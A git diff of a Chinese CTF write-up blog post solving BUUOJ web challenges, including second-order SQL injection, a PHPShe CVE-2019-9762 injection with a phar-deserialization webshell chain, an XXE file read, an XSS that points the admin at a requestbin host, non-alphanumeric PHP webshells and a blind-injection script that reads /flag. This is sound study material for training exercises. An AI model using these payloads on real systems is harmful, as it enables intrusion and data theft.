@@ -3,7 +3,7 @@ title: "buuoj刷题记录-web"
 slug: "buuoj-web-wp"
 description: "温故而知新，学他妈的"
 date: 2022-01-19T03:16:47+08:00
-categories: ["CTF"]
+categories: ["LTS", "CTF"]
 series: []
 tags: ["wp"]
 draft: false
@@ -14,7 +14,7 @@ toc: true
 
 打星号的可能是因为环境问题复现不了，或者自己有地方没搞懂
 
-————前排食用注意：可展开的部分中是没有很好的md排版的
+————前排食用注意：可展开的部分中是没有很好的md排版的（不做二级标题是不想左侧toc和整体页面太臃肿Orz.
 
 ----
 
@@ -1038,6 +1038,116 @@ O:8:"UserInfo":3:{s:4:"name";s:4:"amiz";s:3:"age";i:18;s:4:"blog";s:29:"file:///
 ```
 
 有点奇怪的，你说它过滤空格，但是前面那个不用注释也可以，而且前面参数是1还不行
+
+{{% /spoiler %}}
+
+## page 03
+
+{{% spoiler "[网鼎杯 2018]Comment" %}}
+
+发帖会先要求登录，提示`zhangwei: zhangwei***`，盲猜666，登入
+
+帖子的详情页可以提交留言，这里有xss（但是没啥用 又没bot），f12有一句提示`程序员GIT写一半跑路了,都没来得及Commit :)`，用Githacker看看源码
+
+```
+githacker --url http://c7839413-2569-4342-ac29-8b5810a4c8c4.node4.buuoj.cn:81/ --folder result
+```
+
+因为提示说有一个记录没有commit，我们尝试恢复
+
+```
+git log --reflog	# 有一条后面带括号(refs/stash) 暂存区
+sudo git reset --hard e5b2a2443c2b6d395d06960123142bc91123148c
+```
+
+得到完整的源码
+
+```php
+<?php
+include "mysql.php";
+session_start();
+if($_SESSION['login'] != 'yes'){
+    header("Location: ./login.php");
+    die();
+}
+if(isset($_GET['do'])){
+    switch ($_GET['do'])
+    {
+        case 'write':
+            $category = addslashes($_POST['category']);
+            $title = addslashes($_POST['title']);
+            $content = addslashes($_POST['content']);
+            $sql = "insert into board
+            set category = '$category',
+                title = '$title',
+                content = '$content'";
+            $result = mysql_query($sql);
+            header("Location: ./index.php");
+            break;
+        case 'comment':
+            $bo_id = addslashes($_POST['bo_id']);
+            $sql = "select category from board where id='$bo_id'";
+            $result = mysql_query($sql);
+            $num = mysql_num_rows($result);
+            if($num>0){
+                $category = mysql_fetch_array($result)['category'];
+                $content = addslashes($_POST['content']);
+                $sql = "insert into comment
+            set category = '$category',
+                content = '$content',
+                bo_id = '$bo_id'";
+                $result = mysql_query($sql);
+            }
+            header("Location: ./comment.php?id=$bo_id");
+            break;
+        default:
+            header("Location: ./index.php");
+    }
+}
+else{
+    header("Location: ./index.php");
+}
+?>
+```
+
+可以看到只有`category`没有被`addslashes`过滤，是直接将执行的结果进行拼接，这里是我们的入手点；先在write处插入，再在comment处闭合前面的注释符，执行结果
+
+```
+write: category=',content=user(),/*
+comment: content=*/#
+```
+
+![image-20210624160242124.png](https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210624160242124.png)
+
+```
+write: category=',content=(select load_file('/etc/passwd')),/*
+comment: content=*/#
+```
+
+![](https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210624160515229.png)
+
+看到最后一行的www用户，继续查看.bash_history记录
+
+```
+write: category=',content=(select load_file('/home/www/.bash_history')),/*
+comment: content=*/#
+```
+
+看到了.DS_Store文件，在linux中它的位置一般在`/tmp`下，同时.DS_Store中经常有不可见字符，所以加一层hex再读出
+
+```
+write: category=',content=(select hex(load_file('/tmp/html/.DS_Store'))),/*
+comment: content=*/#
+```
+
+看到flag_8946e1ff1ee3e40f.php，也加一层hex
+
+```
+write: category=',content=(select hex(load_file('/var/www/html/flag_8946e1ff1ee3e40f.php'))),/*
+comment: content=*/#
+```
+
+————雀食很牛逼的二次注入
 
 {{% /spoiler %}}
 
@@ -3243,6 +3353,1217 @@ $phar -> stopBuffering();
 再回到注册上传那里，修改用户名为`php://amiz`，然后GET参数触发shell即可
 
 {{% /spoiler %}}
+
+{{% spoiler "[RoarCTF 2019]PHPShe" %}}
+
+附件里有`.idea`，给了一些提示，是1.7版本的phpshe，有[两个已知的cve](https://anquan.baidu.com/article/697)，不过xxe那个因为不存在对应的php文件，所以用sql那个cve-2019-9762，下面跟一下分析的过程
+
+在include/function/global.func.php下有针对数据库安全的函数`pe_dbhold()`
+
+![image-20220119152726454](https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20220119152726454.png)
+
+参数会被`addslashes`处理，我们的引号和反斜杠不保，那看看有没有不用引号也可以注入的地方或者是宽字节注入
+
+在include/plugin/payment/alipay/pay.php中对`$order_id`参数进行了这样的处理
+
+![image-20220119153255328](https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20220119153255328.png)
+
+其中奇奇怪怪的`$_g_id`是对post参数的重命名，在common.php中
+
+![image-20220119153357784](https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20220119153357784.png)
+
+用到了`extract`对变量名前面加上`_g_`或`_p_`的前缀
+
+回到上面，get方式传入的id参数先经过`pe_dbhold`处理后赋值给`$order_id`，随后进入`order_table`函数，位于hook/order.hook.php
+
+![image-20220119153634436](https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20220119153634436.png)
+
+如果传入的参数含有`_`，则会以它为分隔符，返回`order_`+`_`前的第一部分，如果参数不含`_`直接返回order
+
+再回到前面的`pe_select`，位于include/class/db.class.php
+
+![image-20220119154502441](https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20220119154502441.png)
+
+这不巧了，参数部分用的是反引号而不是单引号，传入的`$order_id`就是这里的`$table`部分，`dbpre`是数据库表前缀；构造这样的payload
+
+```
+pay` where 1=1 and sleep(5)%23_
+```
+
+经过`order_table`和`pe_select`之后是这样的语句
+
+```
+select * from `order_pay` where 1=1 and sleep(5)#` where `order_id` = `pay` where 1=1 and sleep(5)#_ limit 1
+```
+
+然后找利用点，在include/plugin/payment/alipay/pay.php中有利用点并且有回显位；因为对`_`的特殊处理，我们无法用`information_schema`来查表，所以只能在不知道列名的情况下注入
+
+```
+select`3`from(select 1,2,3,4,5,6 union select * from admin)a limit 1,1
+```
+
+构造payload
+
+```
+GET /include/plugin/payment/alipay/pay.php?id=pay`%20where%201=1%20union%20select%201,2,((select`3`from(select%201,2,3,4,5,6%20union%20select%20*%20from%20admin)a%20limit%201,1)),4,5,6,7,8,9,10,11,12%23_
+```
+
+得到admin密码的md5值，查一下得到`altman777`，在/admin.php处登入后台
+
+首先在品牌管理处可以上传文件
+
+借助.idea给出的提示，在include/class/pclzip.class.php有个比官方文件多出来的`__destruct`
+
+![image-20220119161251378](https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20220119161251378.png)
+
+还有自带的`__construct`
+
+![image-20220119161950386](https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20220119161950386.png)
+
+还有个打开的module/admin/moban.php和include/function/global.func.php，在`down`操作中实例化上面的`PclZip`类，之后用`extract()`来解压zip文件，`$moban_template`是文件路径
+
+![image-20220119162417889](https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20220119162417889.png)
+
+在`del`操作中调用`pe_dirdel`
+
+![image-20220119162704144](https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20220119162704144.png)
+
+![image-20220119162714647](https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20220119162714647.png)
+
+有个`is_file($dir_path)`可以触发反序列化
+
+结合上面的`__destruct`中的`extract`，肯定是phar反序列化了，在前面上传的地方上传压缩过的webshell，然后再传入phar，里面参数的路径指向前面的zip路径，被反序列化后触发`__destruct` 解压zip到一个可读写目录/var/www/html/data中
+
+```
+<?php eval($_POST['amiz']);?>
+```
+
+http://acdb618d-67d7-416b-a534-23a858dbe1e4.node4.buuoj.cn:81/data/attachment/brand/1.zip
+
+```
+<?php
+class PclZip{
+    var $zipname = '';
+    var $zip_fd = 0;
+    var $error_code = 1;
+    var $error_string = '';
+    var $magic_quotes_status;
+    var $save_path = '/var/www/html/data';//解压目录
+
+    function __construct($p_zipname){
+
+        $this->zipname = $p_zipname;
+        $this->zip_fd = 0;
+        $this->magic_quotes_status = -1;
+
+        return;
+    }
+
+}
+
+$a=new PclZip("/var/www/html/data/attachment/brand/1.zip");//压缩的文件路径
+echo serialize($a);
+$phar = new Phar("phar.phar");
+$phar->startBuffering();
+$phar->setStub("<?php __HALT_COMPILER(); ?>");
+$phar->setMetadata($a);
+$phar->addFromString("test.txt", "m0c1nu7");
+$phar->stopBuffering();
+?>
+
+```
+
+http://acdb618d-67d7-416b-a534-23a858dbe1e4.node4.buuoj.cn:81/data/attachment/brand/2.txt
+
+之后触发phar反序列化
+
+```
+GET /admin.php?mod=moban&act=del&token=709991a77ab3f79e5dcad72d0453978e&tpl=phar:///var/www/html/data/attachment/brand/2.txt
+Referer: http://acdb618d-67d7-416b-a534-23a858dbe1e4.node4.buuoj.cn:81/admin.php?mod=moban
+```
+
+这里需要传入csrf的token（post上传处可以拿到），还需要设置一下Referer
+
+flag{9085d530-559f-49bd-9e0e-718780146bd3}
+
+{{% /spoiler %}}
+
+{{% spoiler "*[Zer0pts2020]musicblog" %}}
+
+注册账号并登入，可以创建post，勾选publish可以有admin访问，这肯定是个xss类的题目了
+
+整个站有比较完善的csp规则
+
+![image-20220119180148197](https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20220119180148197.png)
+
+看下worker.js的工作逻辑
+
+```js
+const fs = require('fs')
+const md5 = require('md5');
+
+const puppeteer = require('puppeteer');
+const Redis = require('ioredis');
+const connection = new Redis(6379, 'redis');
+
+const admin_username = "admin";
+const admin_password = "w28J0zjqpp6w9Ty8Sl58Z7iEf4h911zZ";
+const flag = 'zer0pts{M4sh1m4fr3sh!!}';
+
+const browser_option = {
+    executablePath: 'google-chrome-unstable',
+    headless: true,
+    args: [
+        '--no-sandbox',
+        '--disable-background-networking',
+        '--disable-default-apps',
+        '--disable-extensions',
+        '--disable-gpu',
+        '--disable-sync',
+        '--disable-translate',
+        '--hide-scrollbars',
+        '--metrics-recording-only',
+        '--mute-audio',
+        '--no-first-run',
+        '--safebrowsing-disable-auto-update',
+    ],
+};
+let browser = undefined;
+
+const crawl = async (url) => {
+    console.log(`[+] Query! (${url})`);
+    const page = await browser.newPage();
+    try {
+        await page.setUserAgent(flag);
+        await page.goto(url, {
+            waitUntil: 'networkidle0',
+            timeout: 3 * 1000,
+        });
+        page.click('#like');
+        await page.waitForNavigation({timeout: 3000});
+    } catch (err){
+        console.log(err);
+    }
+    await page.close();
+    console.log(`[+] Done! (${url})`)
+};
+
+const init = async () => {
+    const browser = await puppeteer.launch(browser_option);
+    const page = await browser.newPage();    
+    console.log(`[+] Setting up...`);
+    try {
+        await page.goto(`http://challenge/login.php`);
+        await page.waitFor('#username');
+        await page.type('#username', admin_username);
+        await page.waitFor('#password');
+        await page.type('#password', admin_password);
+        await page.waitFor('#login-submit');
+        await Promise.all([
+            page.$eval('#login-submit', elem => elem.click()),
+            page.waitForNavigation()
+        ]);
+        const body = await page.evaluate(() => document.body.innerHTML);
+        if (!body.includes('href="posts.php"')){
+            throw Error(`Login failed at ${page.url()}.`);
+        }
+        console.log(`[+] Setup done!`);
+    } catch (err) {
+        console.log(`[-] Error while setting up :(`);
+        console.log(err);
+        const body = await page.evaluate(() => document.body.innerHTML);
+        console.log(`body: ${body}`);
+    }
+    try{ 
+        await page.close();
+    } catch (err) {
+        console.log(err);
+    }
+    return browser;
+};
+
+function handle(){
+    console.log("[+] handle");
+    connection.blpop("query", 0, async function(err, message) {
+        if (browser === undefined) browser = await init();
+        await crawl("http://challenge/post.php?id=" + message[1]);
+        setTimeout(handle, 10); // handle next
+    });
+}
+handle(); // first ignite
+
+```
+
+可以看到有flag，肯定是要xss拿到；admin会先登入admin账号，接着crawl()访问url
+
+```js
+try {
+    await page.setUserAgent(flag);
+    await page.goto(url, {
+        waitUntil: 'networkidle0',
+        timeout: 3 * 1000,
+    });
+    page.click('#like');
+    await page.waitForNavigation({timeout: 3000});
+} catch (err){
+    console.log(err);
+}
+```
+
+会点击页面的`#like`，也就是上面创建Post时勾选的框
+
+![image-20220119180603461](https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20220119180603461.png)
+
+![image-20220119180442910](https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20220119180442910.png)
+
+注意到它对标签的过滤，但是允许`<audio>`的存在
+
+查资料可知`strip_tags`有安全问题，它不会过滤`<a/udio>`标签，并且`<a/udio>`会作为超链接`<a>`被解析，同时超链接的跳转是不受csp的控制的，payload
+
+```
+<a/udio id=like href="http://http.requestbin.buuoj.cn/v4c4pyv4">aa</a/udio>
+```
+
+buu改k8s之后内网的题多少有点问题，一直拿不到flag，寄
+
+{{% /spoiler %}}
+
+{{% spoiler "[FireshellCTF2020]Cars" %}}
+
+这咋就apk了……算了，摁看
+
+在Rest.kt中看到三个路由
+
+![image-20220119185150236](https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20220119185150236.png)
+
+在domain目录下可以看到对应接收的参数格式，/comment可以传入name和message；在CommentActivity中有个`send_comment`调用了`postComment`
+
+![image-20220119190020847](https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20220119190020847.png)
+
+这里使用了`GsonConvertFactory`，这是一个解析json的库，同时这里还引入了`retrofit2`，给我们xxe的可能
+
+```xml
+<?xml  version="1.0" encoding="ISO-8859-1"?>
+<!DOCTYPE foo [
+   <!ELEMENT foo ANY >
+      <!ENTITY xxe SYSTEM  "file:///flag" >
+]>
+<Comment>
+    <name>&xxe;</name>
+    <message>flag please!</message>
+</Comment>
+```
+
+记得修改Content-Type为application/xml
+
+flag{d96dc7a4-8be4-4e05-9bbf-64fcf8009182}
+
+{{% /spoiler %}}
+
+{{% spoiler "[网鼎杯 2020 总决赛]Novel" %}}
+
+只看给的附件，大概扫一下猜测是个反序列化的题；然后看下页面交互，好像跟猜的有一点不太一样，可以选择私藏，会post访问/back/backup，对应的是back.class.php 传入filename和path，选择上传文件会post访问/upload/profile，对应的是upload.class.php
+
+index.php中关键处在这里
+
+![image-20220119223606818](https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20220119223606818.png)
+
+back类中除backup外还有三个私有函数`_write`, `_create`, `random_code	`，在调用`backup`时会先依次调用这几个函数进行处理
+
+`backup`中，首先判断`profile/`下有没有同名文件，对内容进行`htmlspecialchars`处理后，先是用`random_code`生成随机密码，然后进行
+
+```
+$this->_write($dest, $this->_create($password, $content));
+```
+
+`_create`会将密码和内容拼到一起
+
+```
+private function _create($password, $content){
+   $_content='<?php $_GET["password"]==="'.$password.'"?print("'.$content.'"):exit(); ';
+   return $_content;
+}
+```
+
+随后进入`_write`
+
+```php
+private function _write($dest, $content){
+   $f1=$dest;
+   $f2='private/'.$this->random_code(10).".php";
+
+   $stream_f1 = fopen($f1, 'w+');
+
+   fwrite($stream_f1, $content);
+   rewind($stream_f1);
+   $f1_read=fread($stream_f1, 3000);
+   
+   preg_match('/^<\?php \$_GET\[\"password\"\]===\"[a-zA-Z0-9]{8}\"\?print\(\".*\"\):exit\(\); $/s', $f1_read, $matches);
+   
+   if(!empty($matches[0])){
+      copy($f1,$f2);
+      fclose($stream_f1);   
+      return $f2;     
+   }else{
+      fwrite($stream_f1, '<?php exit(); ?>');
+      fclose($stream_f1);
+      return false;
+   }
+
+}
+```
+
+先将`$dest`和上面`_create`生成的内容拼一起，然后对内容进行过滤处理，通过过滤的话将会在`/private`目录下存一份备份文件并返回完整路径，没通过过滤的话会在文件中写入死亡exit
+
+我们的攻击思路是上传一个txt，之后通过back生成后缀为php的备份文件，拿webshell；构造payload
+
+amiz.txt
+
+```
+{${eval($_GET[1])}}
+```
+
+```
+GET /private/mKrZmVugUo.php?password=4lsUOHWN&1=system('cat /flag.txt');
+```
+
+flag{913c1949-edef-4459-8ffc-7970b9c93f14}
+
+注意这里页面上传的时候要双击submit才会弹出文件管理器
+
+{{% /spoiler %}}
+
+{{% spoiler "[Windows]LFI2019" %}}
+
+开幕雷击，直接就是phpinfo的背景，显示是一个windows系统，没有`disable_functions`也没有`open_basedir`
+
+有三个按钮，info提示flag在flag.php，upload可以上传文件，include可以包含；给了源码，还挺长的，二百多行
+
+大多是一些基础操作，防xss, ssrf, session，有几个类比较显眼，首先是Get，它是include时调用的类，会new一个实例然后调用其中的`get`
+
+```php
+class Get {
+    protected function nanahira(){
+        // senpai notice me //
+        function exploit($data){
+            $exploit = new System();
+        }
+        $_GET['trigger'] && !@@@@@@@@@@@@@exploit($$$$$$_GET['leak']['leak']);
+    }
+    private $filename;
+    function __construct($filename){
+        $this->filename = path_sanitizer($filename);
+    }
+    function get(){
+        if($this->filename === false){
+            return ["msg" => "blocked by path sanitizer", "type" => "error"];
+        }
+        // wtf???? //
+        if(!@file_exists($this->filename)){
+            // index files are *completely* disabled. //
+            if(stripos($this->filename, "index") !== false){
+                return ["msg" => "you cannot include index files!", "type" => "error"];
+            }
+            // hardened sanitizer spawned. thus we sense ambiguity //
+            $read_file = "./files/" . $this->filename;
+            $read_file_with_hardened_filter = "./files/" . path_sanitizer($this->filename, true);
+            if($read_file === $read_file_with_hardened_filter ||
+                @file_get_contents($read_file) === @file_get_contents($read_file_with_hardened_filter)){
+                return ["msg" => "request blocked", "type" => "error"];
+            }
+            // .. and finally, include *un*exploitable file is included. //
+            @include("./files/" . $this->filename);
+            return ["type" => "success"];
+        }else{
+            return ["msg" => "invalid filename (wtf)", "type" => "error"];
+        }
+    }
+}
+```
+
+其中对文件名的waf是`path_sanitizer`，黑名单挺狠的
+
+```php
+function path_sanitizer($dir, $harden=false){
+    $dir = (string)$dir;
+    $dir_len = strlen($dir);
+    // Deny LFI/RFI/XSS //
+    $filter = ['.', './', '~', '.\\', '#', '<', '>'];
+    foreach($filter as $f){
+        if(stripos($dir, $f) !== false){
+            return false;
+        }
+    }
+    // Deny SSRF and all possible weird bypasses //
+    $stream = stream_get_wrappers();
+    $stream = array_merge($stream, stream_get_transports());
+    $stream = array_merge($stream, stream_get_filters());
+    foreach($stream as $f){
+        $f_len = strlen($f);
+        if(substr($dir, 0, $f_len) === $f){
+            return false;
+        }
+    }
+    // Deny length //
+    if($dir_len >= 128){
+        return false;
+    }
+	// Easy level hardening //
+	if($harden){
+		$harden_filter = ["/", "\\"];
+		foreach($harden_filter as $f){
+			$dir = str_replace($f, "", $dir);
+		}
+	}
+    // Sanitize feature is available starting from the medium level //
+    return $dir;
+}
+```
+
+`$filename`单独经过waf之后得到的文件路径`$read_file_with_hardened_filter`必须和之前的`$read_file`不同，读到的文件内容也必须不同
+
+post的地方用的是Put类，大差不差，多了个对code的waf，`code_sanitizer`
+
+```php
+function code_sanitizer($code){
+    // Computer-chan, please don't speak english. Speak something else! //
+    $code = preg_replace("/[^<>!@#$%\^&*\_?+\.\-\\\'\"\=\(\)\[\]\;]/u", "*Nope*", (string)$code);
+    return $code;
+}
+```
+
+正常linux下写入`test`文件，包含`test\`，经过waf之后得到`./files/test`，但是处理前的`./files/test\`无法读取文件内容，失败
+
+这里用到的trick是windows下执行`file_get_contents`时会把`"`解释为`.`
+
+```
+file_get_contents('test.php') === file_get_contents('test"php')
+```
+
+利用这个trick，上传文件名为`test`，读取文件名为`"/test`，过waf后路径为`./files/.test`，处理前路径为`./files/./test`，可以正常读取文件内容
+
+关于shell，继续用p牛的这篇[一些不包含数字和字母的webshell](https://www.leavesongs.com/PENETRATION/webshell-without-alphanum.html)
+
+```
+<?=$_=[];$_="$_";$_=$_[("!"=="!")+("!"=="!")+("!"=="!")];$__=$_;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$___=$_;$___++;$___++;$___++;$___++;$____=$_;$_____=$_;$_____++;$_____++;$_____++;$______=$_;$______++;$______++;$______++;$______++;$______++;$__=$__.$___.$____.$_____.$______;$___=$_;$___++;$___++;$___++;$___++;$___++;$___++;$___++;$___++;$____=$_;$____++;$____++;$____++;$____++;$____++;$____++;$____++;$____++;$____++;$____++;$____++;$_____=$_;$_____++;$_____++;$_____++;$_____++;$__=$__.$___.$____.$_____;$___=$_;$___++;$___++;$___++;$___++;$___++;$____=$_;$____++;$____++;$____++;$____++;$____++;$____++;$____++;$____++;$____++;$____++;$____++;$_____=$_;$______=$_;$______++;$______++;$______++;$______++;$______++;$______++;$___=$___.$____.$_____.$______;$____=$_;$____++;$____++;$____++;$____++;$____++;$____++;$____++;$____++;$____++;$____++;$____++;$____++;$____++;$____++;$____++;$_____=$_;$_____++;$_____++;$_____++;$_____++;$_____++;$_____++;$_____++;$___=$___.'.'.$____.$_____.$____;$__($___);?>
+```
+
+注意对`+`进行url编码
+
+flag{f5bf0f29-bb51-4f28-b9ee-d9ef9b1e3915}
+
+————之后看更多师傅们的wp，发现由于是win的环境还可以有别的trick来利用
+
+win下有磁盘流创建目录的方式
+
+![图片.png](https://cdn.nlark.com/yuque/0/2019/png/298354/1572187075689-2a8c066f-5c30-4f23-9f1f-fd564d4f87f1.png#align=left&display=inline&height=208&name=%E5%9B%BE%E7%89%87.png&originHeight=415&originWidth=900&size=248114&status=done&width=450)
+
+当`file_put_contents`传入的文件名为`amiz::$INDEX_ALLOCATION`时 就会在当前文件夹下创建一个名为`amiz`的文件夹，内容为空
+
+我们先用put创建文件夹，再put向这个文件夹下写shell，最后包含这个文件夹下的shell就可以了
+
+参考：[wp1](https://nikoeurus.github.io/2019/11/04/lfi2019/)  |  [wp2](https://evoa.me/archives/13/)
+
+{{% /spoiler %}}
+
+{{% spoiler "*[RCTF2019]calcalcalc" %}}
+
+给了源码，离谱，有3个语言的后端，pho nodejs python........
+
+先看前端，frontend/views/index.hbs
+
+![image-20220120113421152](https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20220120113421152.png)
+
+会post方式请求`/calculate`，但好像也算不了啥东西，返回201，然后是frontend/src/app.controller.ts
+
+![image-20220120114124197](https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20220120114124197.png)
+
+有一说一ts我看起来好费劲……它还涉及到另外两个文件，calculate.model.ts
+
+![image-20220120114423330](https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20220120114423330.png)
+
+其中用到的`@ExpressionValidator`，expresssion.validator.ts
+
+![image-20220120114452545](https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20220120114452545.png)
+
+如果18行的`isVip`为false，就会判断长度，我们可以直接传入json，设它为true
+
+三个后端都会对我们请求的式子进行运算，但只有三个返回结果一致时才可以通过
+
+Python的后端有处理post请求的部分，backend-python/src/app.py
+
+![image-20220120113740173](https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20220120113740173.png)
+
+会将请求的`expression`参数进行json处理后`eval`，那入手点就在这里了；但是13行的规则比较严苛，我们采用`chr()`的方式绕过
+
+但是由于它没有明确的回显，并且后端处于内网中不能外带数据，所以采用时间盲注的思想，配合二分的脚本拿flag
+
+*由于buuoj的内网环境问题，这里做不了，所以只写一下脚本，等啥时候修复了再回来做（脚本参考guoke师傅的，二分法
+
+核心的盲注payload是这个
+
+```
+__import__('time').sleep(5) if (ord(open('/flag','r').read() [str(i)])>str(mid))else 1
+```
+
+要过waf，所以转为`chr()`的形式，外面包一层`eval`
+
+```
+import requests
+import time
+x=''
+def getpayload(num,mid):
+    payload="__import__('time').sleep(5) if (ord(open('/flag','r').read()["+str(num)+"])>"+str(mid)+") else 1"
+    data=''
+    for i in payload:
+        data+='chr('+str(ord(i))+')+'
+    return('eval('+data[:-1]+')')
+url='xxxx/calculate'
+for a in range(0,60):
+    max = 130
+    min = 30
+    while max >=min:
+        mid=(max+min)//2
+        payload=getpayload(a,mid)
+        time1=time.time()
+        r = requests.post(url, json={'isVip': True, 'expression': payload})
+        time2=time.time()
+        if (time2-time1>5):
+            min=mid+1
+        else:
+            max=mid
+        if max==mid==min:
+            x+=chr(mid)
+            print(str(a)+':'+x)
+            break
+```
+
+参考：[wp](https://skysec.top/2019/05/18/2019-RCTF-Web-Writeup/#%E6%94%BB%E5%87%BB%E6%80%9D%E8%80%83)  |  [wp2](https://guokeya.github.io/post/xUUCnsZ57/)
+
+{{% /spoiler %}}
+
+{{% spoiler "[QWB2021 Quals]托纳多" %}}
+
+注册账号登入，但是只有admin才有flag，那肯定得要sqli了，在登录的地方注了半天，结果发现注入点在注册的页面（尴尬），直接单引号就可以闭合
+
+```
+admin'or '1		# 回显this username had been used
+```
+
+参考官方wp，这里用的是`processlist`表，这个表很特别
+
+![image-20220120160515099](https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20220120160515099.png)
+
+它读取正在执行的sql语句，我们可以通过info列来获得当前的表名列名，还是用祖传的二分法来爆admin的密码
+
+（尴尬的是爆一会儿就寄了，害，寄寄寄
+
+按照预期解，登入后可以任意文件读取，读`/proc/self/cmdline`可以看到`python3 /qwb/app/app.py`，无法直接读app.py，但是可以读pyc
+
+http的响应头中有tornado的版本号6.0.3，对应的python>=3.5，爆破一下pyc的名称，得到pyc
+
+```
+/qwbimage.php?qwb_image_name=/qwb/app/__pycache__/app.cpython-35.pyc
+```
+
+uncompyle6反编译得到源码
+
+```
+import tornado.ioloop, tornado.web, tornado.options, pymysql, os, re
+settings = {'static_path': os.path.join(os.getcwd(), 'static'),
+ 'cookie_secret': 'b93a9960-bfc0-11eb-b600-002b677144e0'}
+db_username = 'root'
+db_password = 'xxxx'
+class MainHandler(tornado.web.RequestHandler):
+
+    def get(self):
+        user = self.get_secure_cookie('user')
+        if user and user == b'admin':
+            self.redirect('/admin.php', permanent=True)
+            return
+        self.render('index.html')
+        
+class LoginHandler(tornado.web.RequestHandler):
+
+    def get(self):
+        username = self.get_argument('username', '')
+        password = self.get_argument('password', '')
+        if not username or not password:
+            if not self.get_secure_cookie('user'):
+                self.finish('<script>alert(`please input your password and username`);history.go(-1);</script>')
+                return
+            if self.get_secure_cookie('user') == b'admin':
+                self.redirect('/admin.php', permanent=True)
+            else:
+                self.redirect('/', permanent=True)
+        else:
+            conn = pymysql.connect('localhost', db_username, db_password, 'qwb')
+            cursor = conn.cursor()
+            cursor.execute('SELECT * from qwbtttaaab111e where qwbqwbqwbuser=%s and qwbqwbqwbpass=%s', [username, password])
+            results = cursor.fetchall()
+            if len(results) != 0:
+                if results[0][1] == 'admin':
+                    self.set_secure_cookie('user', 'admin')
+                    cursor.close()
+                    conn.commit()
+                    conn.close()
+                    self.redirect('/admin.php', permanent=True)
+                    return
+                else:
+                    cursor.close()
+                    conn.commit()
+                    conn.close()
+                    self.finish('<script>alert(`login success, but only admin can get flag`);history.go(-1);</script>')
+                    return
+            else:
+                cursor.close()
+                conn.commit()
+                conn.close()
+                self.finish('<script>alert(`your username or password is error`);history.go(-1);</script>')
+                return
+            
+class RegisterHandler(tornado.web.RequestHandler):
+
+    def get(self):
+        username = self.get_argument('username', '')
+        password = self.get_argument('password', '')
+        word_bans = ['table', 'col', 'sys', 'union', 'inno', 'like', 'regexp']
+        bans = ['"', '#', '%', '&', ';', '<', '=', '>', '\\', '^', '`', '|', '*', '--', '+']
+        for ban in word_bans:
+            if re.search(ban, username, re.IGNORECASE):
+                self.finish('<script>alert(`error`);history.go(-1);</script>')
+                return
+
+        for ban in bans:
+            if ban in username:
+                self.finish('<script>alert(`error`);history.go(-1);</script>')
+                return
+        if not username or not password:
+            self.render('register.html')
+            return
+        if username == 'admin':
+            self.render('register.html')
+            return
+        conn = pymysql.connect('localhost', db_username, db_password, 'qwb')
+        cursor = conn.cursor()
+        try:
+            cursor.execute("SELECT qwbqwbqwbuser,qwbqwbqwbpass from qwbtttaaab111e where qwbqwbqwbuser='%s'" % username)
+            results = cursor.fetchall()
+            if len(results) != 0:
+                self.finish('<script>alert(`this username had been used`);history.go(-1);</script>')
+                conn.commit()
+                conn.close()
+                return
+        except:
+            conn.commit()
+            conn.close()
+            self.finish('<script>alert(`error`);history.go(-1);</script>')
+            return
+        try:
+            cursor.execute('insert into qwbtttaaab111e (qwbqwbqwbuser, qwbqwbqwbpass) values(%s, %s)', [username, password])
+            conn.commit()
+            conn.close()
+            self.finish("<script>alert(`success`);location.href='/index.php';</script>")
+            return
+        except:
+            conn.rollback()
+            conn.close()
+            self.finish('<script>alert(`error`);history.go(-1);</script>')
+            return
+            
+class LogoutHandler(tornado.web.RequestHandler):
+
+    def get(self):
+        self.clear_all_cookies()
+        self.redirect('/', permanent=True)
+        
+class AdminHandler(tornado.web.RequestHandler):
+
+    def get(self):
+        user = self.get_secure_cookie('user')
+        if not user or user != b'admin':
+            self.redirect('/index.php', permanent=True)
+            return
+        self.render('admin.html')
+
+class ImageHandler(tornado.web.RequestHandler):
+
+    def get(self):
+        user = self.get_secure_cookie('user')
+        image_name = self.get_argument('qwb_image_name', 'header.jpeg')
+        if not image_name:
+            self.redirect('/', permanent=True)
+            return
+        else:
+            if not user or user != b'admin':
+                self.redirect('/', permanent=True)
+                return
+            if image_name.endswith('.py') or 'flag' in image_name or '..' in image_name:
+                self.finish("nonono, you can't read it.")
+                return
+            image_name = os.path.join(os.getcwd() + '/image', image_name)
+            with open(image_name, 'rb') as (f):
+                img = f.read()
+            self.set_header('Content-Type', 'image/jpeg')
+            self.finish(img)
+            return
+        
+class SecretHandler(tornado.web.RequestHandler):
+    def get(self):
+        if len(tornado.web.RequestHandler._template_loaders):
